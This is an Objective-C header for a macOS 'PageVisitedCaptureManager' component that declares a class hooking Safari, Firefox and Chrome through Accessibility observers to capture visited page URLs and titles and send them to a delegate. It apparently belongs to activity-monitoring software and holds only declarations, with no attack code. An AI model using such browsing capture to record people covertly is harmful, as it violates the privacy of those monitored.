//
//  PageVisitedNotifier.h
//  PageVisitedCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "PageVisitedDelegate.h"

@protocol PageVisitedDelegate;
@class FirefoxUrlInfoInquirer;

@interface PageVisitedNotifier : NSObject{
@private
    id <PageVisitedDelegate> mPageVisitedDelegate;
    NSString * mPageURLSafari;
    NSString * mPageURLFirefox;
    NSString * mPageURLChrome;
    AXObserverRef mObserver1;
    AXObserverRef mObserver2;
    AXObserverRef mObserver3;
    AXUIElementRef mProcess1;
    AXUIElementRef mProcess2;
    AXUIElementRef mProcess3;
    CFRunLoopRef mLoop1;
    CFRunLoopRef mLoop2;
    CFRunLoopRef mLoop3;
    FirefoxUrlInfoInquirer  *mFirefoxUrlInquirer;
    
    int mSafariSleepTime;
    int mChromeSleepTime;
    int mFirefoxSleepTime;
}
@property (nonatomic,copy)   NSString * mPageURLSafari;
@property (nonatomic,copy)   NSString * mPageURLFirefox;
@property (nonatomic,copy)   NSString * mPageURLChrome;
@property (nonatomic, retain) id <PageVisitedDelegate> mPageVisitedDelegate;
@property (nonatomic, assign) AXObserverRef mObserver1;
@property (nonatomic, assign) AXObserverRef mObserver2;
@property (nonatomic, assign) AXObserverRef mObserver3;
@property (nonatomic, assign) CFRunLoopRef mLoop1;
@property (nonatomic, assign) CFRunLoopRef mLoop2;
@property (nonatomic, assign) CFRunLoopRef mLoop3;
@property (nonatomic, assign) AXUIElementRef mProcess1;
@property (nonatomic, assign) AXUIElementRef mProcess2;
@property (nonatomic, assign) AXUIElementRef mProcess3;

-(id)initWithPageVisitedDelegate:(id<PageVisitedDelegate>) aPageVisitedDelegate;
-(void) startNotify;
-(void) stopNotify;

-(void) registerPageEventSafari;
-(void) unRegisterPageEventSafari;

-(void) registerPageEventFirefox;
-(void) unRegisterPageEventFirefox;

-(void) registerPageEventChrome;
-(void) unRegisterPageEventChrome;

-(void) titleChangeCallBack;
-(void) sendUrl:(NSString *)aUrl PageName:(NSString *)aPageName App:(NSString *)aApp ;
@end
